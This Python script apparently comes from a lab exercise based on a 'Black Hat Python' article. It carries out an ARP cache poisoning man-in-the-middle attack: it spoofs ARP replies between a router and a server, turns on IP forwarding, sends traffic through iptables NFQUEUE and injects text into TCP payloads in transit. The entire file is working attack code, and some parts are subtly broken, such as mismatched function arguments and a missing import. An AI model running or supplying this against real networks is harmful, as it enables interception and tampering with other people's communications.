# Source: https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
from scapy.all import *
import os
import signal
import sys
import threading
import time
import struct
from netfilterqueue import NetfilterQueue as NFQ

# ARP Poison parameters
gateway_ip = "198.7.0.1"
packet_count = 1000
# network interface (for linux)
# conf.iface = "eth0"
conf.verb = 0

def get_mac_address(ip_address):
    # Send ARP request and return the MAC address
    # Source: https://www.thepythoncode.com/article/building-network-scanner-using-scapy
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc

def restore_network(gateway_ip, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    os.system("sysctl -w net.inet.ip.forwarding=0")
    #kill process on a mac
    os.kill(os.getpid(), signal.SIGTERM)

# Function for sending ARP packets
def arp_spoof(target_ip, target_mac, gateway_ip=gateway_ip):
    try:
        # Send ARP packets while the program is running
        if target_mac == "":
            print("TARGET MAC FINDING: ")
            target_mac = get_mac_address(target_ip)
        while True:
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(1)
    except KeyboardInterrupt:
        restore_network(target_ip, target_mac, gateway_ip)
        print("ARP spoofing attack ended.")

last_packet_ack = None
last_packet_seq = None
def modify_packet(packet):
    global last_packet_ack
    global last_packet_seq                                          
    scapy_packet = IP(packet.get_payload())  # Convert string of packet to scapy packet
    
    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw):
        last_packet_ack_str = str(last_packet_ack)
        actual_packet_seq_str = str(scapy_packet[TCP].seq)        
        # if last_packet_ack is not None and last_packet_ack_str[:4] == actual_packet_seq_str[:4]  and last_packet_ack != scapy_packet[TCP].seq:
        #     print("Last packet ack: ", last_packet_ack)
        #     print("Scapy packet seq: ", scapy_packet[TCP].seq)
        #     scapy_packet[TCP].seq = last_packet_ack
        #     print("Scapy packet seq after: ", scapy_packet[TCP].seq)


        last_packet_seq_str = str(last_packet_seq)
        actual_packet_ack_str = str(scapy_packet[TCP].ack)
        if last_packet_seq is not None and last_packet_seq_str[:4] == actual_packet_ack_str[:4] and last_packet_seq != scapy_packet[TCP].ack:
            print("Last packet seq: ", last_packet_seq)
            print("Scapy packet ack: ", scapy_packet[TCP].ack)
            scapy_packet[TCP].ack = last_packet_seq
            print("Scapy packet seq after: ", scapy_packet[TCP].ack)

        # last_packet_ack = scapy_packet[TCP].ack
        # last_packet_seq = scapy_packet[TCP].seq

        load = scapy_packet[Raw].load.decode(errors="ignore")
        print("LOAD INAINTE: ", load)
        modified_load = load + "SALUTARE"
        print("LOAD DUPA: ", modified_load)
        scapy_packet[Raw].load = modified_load.encode()
        
 
        del scapy_packet[IP].len
        del scapy_packet[IP].chksum
        del scapy_packet[TCP].chksum


        packet.set_payload(bytes(scapy_packet))
    

    return packet



def process_packet(packet):
    payload = packet.get_payload()
    
    ip_header = payload[0:20]
    ip_fields = struct.unpack("!BBHHHBBH4s4s", ip_header)
    dest_ip = socket.inet_ntoa(ip_fields[9])

    protocol = ip_fields[6]

    if protocol == 6:
        tcp_header = payload[20:40]
        tcp_fields = struct.unpack("!HHLLBBHHH", tcp_header)
        dest_port = tcp_fields[1]

 

    print("Received packet payload BEFORE:", payload)
    print("\n\n\n")
    print("Original destination IP:", dest_ip)
    print("Source IP:", socket.inet_ntoa(ip_fields[8]))
 

    time.sleep(0.2)
    print("Packet port: ", dest_port)

    scapy_packet = modify_packet(packet)

    global last_packet_ack
    global last_packet_seq
    scapy_packet2 = IP(payload)
    if(scapy_packet2.haslayer(TCP)):
        last_packet_ack = scapy_packet2[TCP].ack
        last_packet_seq = scapy_packet2[TCP].seq

    print("\n\n\n")
    print("Scapy packet payload:", scapy_packet)
    print("Received packet payload AFTER:", packet.get_payload())
    print("\n\n\n")

    scapy_packet.accept()
    print("Packet accepted")

def packet_sniff():
    queue = NFQ()
    try:
        print("Packet sniffing started.")
        queue.bind(5, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("Packet sniffing ended.")
        queue.unbind()

# Start the script
print("Started script")
print("Enabling IP forwarding")

# Enable IP Forwarding on
os.system("sysctl -w net.ipv4.ip_forward=1")
print("IP forwarding enabled in queue 5")
os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")
print("Successfully enabled IP forwarding")
os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")

# ARP poison threads
poison_thread_router = threading.Thread(target=arp_spoof, args=("198.7.0.1", "", "198.7.0.2"))
poison_thread_server = threading.Thread(target=arp_spoof, args=("198.7.0.2", "", "198.7.0.1"))

try:
    poison_thread_router.start()
    time.sleep(1)
    print("router ARP spoofing started")
except:
    print("router ARP spoofing failed")

try:
    poison_thread_server.start()
    time.sleep(1)
    print("server ARP spoofing started")
except:
    print("server ARP spoofing failed")


# Start packet sniffing in a separate thread
sniff_thread = threading.Thread(target=packet_sniff)
try:
    sniff_thread.start()
    print("Packet sniffing started")
except:
    print("Packet sniffing failed")
